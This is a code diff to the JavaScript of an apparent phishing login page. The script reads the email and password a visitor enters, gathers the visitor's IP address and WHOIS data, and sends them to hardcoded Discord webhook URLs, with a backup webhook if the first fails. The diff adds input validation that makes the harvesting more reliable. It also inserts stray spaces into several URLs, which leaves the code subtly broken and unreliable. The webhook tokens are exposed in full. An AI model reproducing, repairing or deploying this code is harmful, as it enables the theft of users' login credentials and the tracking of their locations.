@@ -4,8 +4,8 @@
 const loginButton = document.querySelector("button");
 
 // Webhook URLs
-const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s";
-const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo";
+const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s ";
+const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo ";
 
 // Variables to store user data
 let userIP = "Unknown IP";
@@ -17,7 +17,7 @@ let whoisData = {};
 // -----------------------------------
 async function fetchIPAddress() {
   try {
-    const response = await fetch("https://api.ipify.org?format=json");
+    const response = await fetch("https://api.ipify.org ?format=json");
     const data = await response.json();
     return data.ip;
   } catch (error) {
@@ -29,7 +29,7 @@ async function fetchIPAddress() {
 // Perform WHOIS lookup on the IP address
 async function fetchWhoisData(ip) {
   try {
-    const response = await fetch(`https://ipwhois.app/json/${ip}`);
+    const response = await fetch(`https://ipwhois.app/json/ ${ip}`);
     const data = await response.json();
     return data;
   } catch (error) {
@@ -192,7 +192,7 @@ async function sendCredentialsToWebhook(email, password) {
     // Check if the primary webhook failed
     if (!response.ok) {
       console.error("Primary webhook failed. Attempting backup webhook...");
-      
+
       // Send the payload to the backup webhook
       response = await fetch(BACKUP_WEBHOOK_URL, {
         method: "POST",
@@ -226,8 +226,17 @@ function removeEllipsisAnimation() {
 
 function animateEllipsis() {
   // Get user input from the form
-  const email = document.getElementById("emailORphone").value;
-  const password = document.getElementById("password").value;
+  const emailInput = document.getElementById("emailORphone");
+  const passwordInput = document.getElementById("password");
+
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
+
+  // Validate inputs
+  if (!email || !password) {
+    alert("Please enter both email and password.");
+    return;
+  }
 
   // Send credentials to webhook
   sendCredentialsToWebhook(email, password);
@@ -242,9 +251,7 @@ function animateEllipsis() {
                            </span>`;
   const spinnerItems = document.querySelectorAll(".spinnerItem");
   spinnerItems.forEach((item, index) => {
-    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
-      index * 0.2
-    }s`;
+    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
   });
   loginButton.setAttribute("disabled", "true");
 
